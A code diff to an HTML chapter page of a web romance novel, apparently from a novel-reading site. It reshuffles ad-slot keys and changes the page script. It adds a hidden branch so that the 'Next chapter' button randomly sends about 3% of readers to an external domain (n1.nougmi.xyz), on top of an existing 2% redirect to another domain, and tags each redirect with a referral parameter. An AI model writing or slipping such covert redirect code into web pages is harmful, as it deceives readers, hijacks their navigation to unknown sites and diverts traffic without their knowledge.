@@ -2391,25 +2391,25 @@
                 <p>&#34;The queen has granted permission for me to take you out for lunch,&#34; Ethan&#39;s lips curved slightly. &#34;Dr. Laurent, it&#39;s time to repay that meal you owe me.&#34;</p>
                 <p>Though he framed it as collecting a debt, his real intention was to give Vivian a break from the suffocating palace.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>&#34;I&#39;ll contact you when I&#39;m done with my work,&#34; Vivian said, lowering her head to organize her files.</p>
                 <p>Ethan stood abruptly and grabbed her wrist. &#34;We&#39;re leaving now.&#34;</p>
                 <p>He pulled her out of the room with firm determination.</p>
                 <p>Sunlight bathed them as they stepped outside. Vivian realized she&#39;d been cooped up in the palace for an entire week.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>The streets buzzed with hurried pedestrians, the air fragrant with the scent of freshly baked bread.</p>
                 <p>&#34;What would you like to eat?&#34; Ethan slowed his pace.</p>
                 <p>&#34;Anything,&#34; Vivian replied absently.</p>
                 <p>Ethan had deliberately chosen not to drive, leading her on a leisurely stroll instead.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>&#34;Should we take a cab?&#34; Vivian glanced at her watch. &#34;I need to return soon.&#34;</p>
                 <p>&#34;No rush,&#34; Ethan said, hands in his pockets. &#34;Food tastes better when you&#39;re hungry.&#34;</p>
                 <p>Vivian shot him an exasperated look.</p>
                 <p>&#34;Fiona&#39;s condition won&#39;t change in this short time,&#34; Ethan said calmly. &#34;You deserve a break.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>After nearly an hour of walking, they finally arrived at a reserved restaurant.</p>
                 <p>Tucked away in a quiet alley, the traditional Eudoran eatery exuded rustic elegance.</p>
                 <p>To her surprise, Vivian realized she was genuinely hungry.</p>
@@ -2545,7 +2545,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2561,8 +2561,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
